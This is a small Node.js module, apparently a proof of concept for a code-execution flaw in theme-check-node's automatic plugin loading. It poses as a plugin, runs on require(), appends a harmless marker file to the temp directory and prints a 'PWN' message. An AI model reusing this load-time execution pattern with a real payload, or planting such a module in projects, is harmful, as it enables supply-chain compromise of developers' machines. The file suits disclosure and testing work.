const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const markerPath = path.join(os.tmpdir(), 'theme_rce_marker_1337.txt');
const payload =
  'THEME_RCE_MARKER_1337' +
  ' | time=' + new Date().toISOString() +
  ' | pid=' + process.pid +
  ' | cwd=' + process.cwd() +
  ' | __filename=' + __filename +
  ' | parentPackageBeingLoadedBy=theme-check-node auto-glob require()';

fs.writeFileSync(markerPath, payload + '\n', { flag: 'a' });

console.error('[theme-check-evil] PWN: arbitrary code executed via auto-glob require()');
console.error('[theme-check-evil] marker appended to: ' + markerPath);

module.exports = { checks: [] };
